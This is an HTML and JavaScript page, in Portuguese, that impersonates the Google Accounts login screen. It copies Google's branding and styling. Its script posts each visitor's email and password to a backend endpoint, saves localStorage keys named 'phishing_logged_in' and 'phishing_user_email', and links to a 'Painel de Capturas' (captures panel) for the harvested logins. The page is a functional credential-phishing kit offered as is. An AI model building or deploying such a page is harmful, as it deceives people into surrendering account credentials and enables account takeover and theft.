<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login - Google Accounts</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: #fff;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
        }
        
        .login-container {
            width: 100%;
            max-width: 450px;
            padding: 20px;
        }
        
        .login-card {
            border: 1px solid #dadce0;
            border-radius: 8px;
            padding: 48px 40px 36px;
            background: #fff;
        }
        
        .logo {
            display: flex;
            justify-content: center;
            margin-bottom: 10px;
        }
        
        .logo svg {
            width: 75px;
            height: 24px;
        }
        
        h1 {
            font-size: 24px;
            font-weight: 400;
            color: #202124;
            text-align: center;
            margin-bottom: 8px;
        }
        
        .subtitle {
            font-size: 16px;
            color: #202124;
            text-align: center;
            margin-bottom: 40px;
        }
        
        .login-form {
            display: flex;
            flex-direction: column;
            gap: 30px;
        }
        
        .input-group {
            position: relative;
        }
        
        .input-group input {
            width: 100%;
            padding: 13px 15px;
            border: 1px solid #dadce0;
            border-radius: 4px;
            font-size: 16px;
            outline: none;
            transition: border-color 0.2s;
            background: transparent;
        }
        
        .input-group input:focus {
            border-color: #1a73e8;
            border-width: 2px;
            padding: 12px 14px;
        }
        
        .input-group label {
            position: absolute;
            left: 15px;
            top: 50%;
            transform: translateY(-50%);
            color: #5f6368;
            font-size: 16px;
            pointer-events: none;
            transition: all 0.2s;
            background: #fff;
            padding: 0 4px;
        }
        
        .input-group input:focus + label,
        .input-group input:not(:placeholder-shown) + label {
            top: 0;
            font-size: 12px;
            color: #1a73e8;
        }
        
        .error {
            color: #d93025;
            font-size: 14px;
            margin-top: -20px;
            min-height: 20px;
        }
        
        .login-button {
            background: #1a73e8;
            color: #fff;
            border: none;
            border-radius: 4px;
            padding: 12px 24px;
            font-size: 14px;
            font-weight: 500;
            cursor: pointer;
            transition: background 0.2s;
            margin-top: 10px;
        }
        
        .login-button:hover {
            background: #1557b0;
        }
        
        .login-button:disabled {
            background: #1a73e880;
            cursor: not-allowed;
        }
        
        .footer-links {
            display: flex;
            justify-content: space-between;
            margin-top: 40px;
            padding-top: 20px;
            border-top: 1px solid #dadce0;
        }
        
        .footer-links a {
            color: #5f6368;
            text-decoration: none;
            font-size: 14px;
        }
        
        .footer-links a:hover {
            text-decoration: underline;
        }
        
        @media (max-width: 450px) {
            .login-card {
                padding: 24px 20px;
                border: none;
                border-radius: 0;
            }
            
            .login-container {
                padding: 0;
                max-width: 100%;
            }
        }
    </style>
</head>
<body>
    <div class="login-container">
        <div class="login-card">
            <div class="logo">
                <svg viewBox="0 0 75 24" width="75" height="24" xmlns="http://www.w3.org/2000/svg">
                    <path d="M13.04 14.28c.47 0 .88-.16 1.23-.48.35-.32.52-.7.52-1.15 0-.45-.17-.83-.52-1.14-.35-.31-.76-.47-1.23-.47-.47 0-.88.16-1.23.48-.35.31-.52.7-.52 1.14 0 .45.17.83.52 1.15.35.32.76.48 1.23.48zm7.14-3.44c0 .34-.03.67-.09.99-.08.55-.23 1.02-.45 1.41-.3.63-.73 1.1-1.29 1.41-.56.31-1.22.47-1.98.47-.52 0-1-.09-1.45-.28-.45-.19-.84-.47-1.15-.85-.31-.38-.55-.84-.72-1.39-.17-.55-.25-1.16-.25-1.84h2.13c0 .46.04.87.12 1.23.08.36.2.67.37.92.17.25.38.44.64.57.25.13.55.2.89.2.37 0 .69-.1.95-.29.26-.19.43-.42.5-.68h2.17c-.25.95-.78 1.72-1.59 2.3-.81.58-1.85.87-3.12.87-.71 0-1.36-.11-1.95-.33-.59-.22-1.1-.54-1.52-.96-.42-.42-.75-.92-.98-1.51-.23-.59-.35-1.26-.35-2.01 0-.76.12-1.44.36-2.04.24-.6.58-1.1 1.02-1.5.44-.4.96-.7 1.56-.9.6-.2 1.27-.3 2.01-.3.74 0 1.4.1 1.98.3.58.2 1.07.5 1.48.89.41.39.72.87.93 1.44.21.57.31 1.21.31 1.93h-2.13c0-.49-.05-.92-.16-1.29-.11-.37-.28-.67-.5-.9-.22-.23-.51-.34-.85-.34-.34 0-.63.11-.86.34-.23.23-.38.53-.45.9-.07.37-.11.79-.11 1.26zm-5.65 3.17c0-.68.1-1.33.29-1.96.19-.63.47-1.18.83-1.65.36-.47.82-.84 1.37-1.11.55-.27 1.19-.41 1.92-.41.73 0 1.37.14 1.92.41.55.27 1.01.64 1.37 1.11.36.47.64 1.02.83 1.65.19.63.29 1.28.29 1.96 0 .68-.1 1.33-.29 1.96-.19.63-.47 1.18-.83 1.65-.36.47-.82.84-1.37 1.11-.55.27-1.19.41-1.92.41-.73 0-1.37-.14-1.92-.41-.55-.27-1.01-.64-1.37-1.11-.36-.47-.64-1.02-.83-1.65-.19-.63-.29-1.28-.29-1.96z" fill="#4285F4"></path>
                    <path d="M22.2 6.73h-2.6v-1.7h-2.5v1.7h-1.2v2h1.2v3.5c0 1.4.3 2.5.9 3.3.6.8 1.5 1.2 2.6 1.2.4 0 .8-.1 1.2-.2v-2c-.3.1-.7.1-1.1.1-.6 0-1.1-.2-1.4-.5-.3-.3-.5-.8-.5-1.4v-3h2.6v-2z" fill="#EA4335"></path>
                    <path d="M26.8 6.73h-2.5v10h2.5v-4.2c0-1.2.1-2.3.4-3.3.3-1 .8-1.9 1.5-2.6.7-.7 1.6-1.1 2.7-1.1v2.5c-.4 0-.8.1-1.1.3-.3.2-.5.5-.6.9-.1.4-.2.9-.2 1.4v4.1h2.5v-4.4c0-1.1.1-2.1.3-3 .2-.9.6-1.7 1.1-2.3.5-.6 1.2-1.1 2.1-1.4.9-.3 2-.5 3.2-.5v2.6c-1.1 0-2.1.1-3 .4-.9.3-1.7.7-2.3 1.3-.6.6-1.1 1.3-1.4 2.2-.3.9-.5 1.9-.5 3.1v4.4h2.5v-4.7c0-1.1.1-2.1.3-3 .2-.9.6-1.7 1.1-2.3.5-.6 1.2-1.1 2.1-1.4.9-.3 2-.5 3.2-.5v2.6c-1.1 0-2.1.1-3 .4-.9.3-1.7.7-2.3 1.3-.6.6-1.1 1.3-1.4 2.2-.3.9-.5 1.9-.5 3.1v4.7h2.5v-9.9z" fill="#4285F4"></path>
                </svg>
            </div>
            <h1>Fazer login</h1>
            <p class="subtitle">Use sua Conta do Google</p>
            
            <form id="loginForm" class="login-form">
                <div class="input-group">
                    <input type="email" id="email" name="email" required autocomplete="email">
                    <label for="email">Email ou telefone</label>
                </div>
                
                <div class="input-group">
                    <input type="password" id="password" name="password" required minlength="8" autocomplete="current-password">
                    <label for="password">Senha</label>
                </div>
                
                <p id="error" class="error"></p>
                
                <button type="submit" class="login-button" id="submitBtn">
                    <span id="btnText">Login</span>
                </button>
            </form>
            
            <div class="footer-links">
                <a href="#">Ajuda</a>
                <a href="#">Privacidade</a>
                <a href="#">Termos</a>
                <a href="/logs.html" style="color: #1a73e8;">Painel de Capturas</a>
            </div>
        </div>
    </div>
    
    <script>
        const API_URL = import.meta.env.VITE_API_URL || '/api';
        const form = document.getElementById('loginForm');
        const emailInput = document.getElementById('email');
        const passwordInput = document.getElementById('password');
        const errorEl = document.getElementById('error');
        const submitBtn = document.getElementById('submitBtn');
        const btnText = document.getElementById('btnText');

        form.addEventListener('submit', async (e) => {
            e.preventDefault();
            errorEl.textContent = '';
            
            const email = emailInput.value.trim();
            const password = passwordInput.value;
            
            if (!email) {
                errorEl.textContent = 'Digite um email válido';
                return;
            }
            
            if (password.length < 8) {
                errorEl.textContent = 'A senha deve ter pelo menos 8 dígitos';
                return;
            }
            
            submitBtn.disabled = true;
            btnText.textContent = 'Entrando...';
            
            try {
                const response = await fetch(`${API_URL}/login`, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({ email, password }),
                });
                
                const data = await response.json();
                
                if (response.ok) {
                    // Marcar como logado no localStorage para cache offline
                    localStorage.setItem('phishing_logged_in', 'true');
                    localStorage.setItem('phishing_user_email', email);
                    localStorage.setItem('phishing_login_time', new Date().toISOString());
                    
                    // Mostrar sucesso e redirecionar
                    form.innerHTML = `
                        <div style="text-align: center; padding: 40px 0;">
                            <svg width="64" height="64" viewBox="0 0 24 24" fill="none">
                                <circle cx="12" cy="12" r="12" fill="#34A853"/>
                                <path d="M7 12l3 3 7-7" stroke="white" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
                            </svg>
                            <h2 style="margin-top: 20px; color: #202124; font-weight: 400;">Login efetuado!</h2>
                            <p style="margin-top: 10px; color: #5f6368; font-size: 14px;">Redirecionando...</p>
                        </div>
                    `;
                    
                    // Registrar service worker para cache offline
                    if ('serviceWorker' in navigator) {
                        navigator.serviceWorker.register('/sw.js').catch(function(){});
                    }
                    
                    // Redirecionar após 1 segundo
                    setTimeout(function() {
                        window.location.href = '/apos_login.html';
                    }, 1000);
                } else {
                    errorEl.textContent = data.error || data.message || 'Erro ao fazer login';
                    submitBtn.disabled = false;
                    btnText.textContent = 'Login';
                }
            } catch (err) {
                errorEl.textContent = 'Erro de conexão';
                submitBtn.disabled = false;
                btnText.textContent = 'Login';
            }
        });

        passwordInput.addEventListener('input', () => {
            if (passwordInput.value.length >= 8) {
                passwordInput.style.borderColor = '#34A853';
            } else {
                passwordInput.style.borderColor = '#dadce0';
            }
        });
    </script>
</body>
</html>
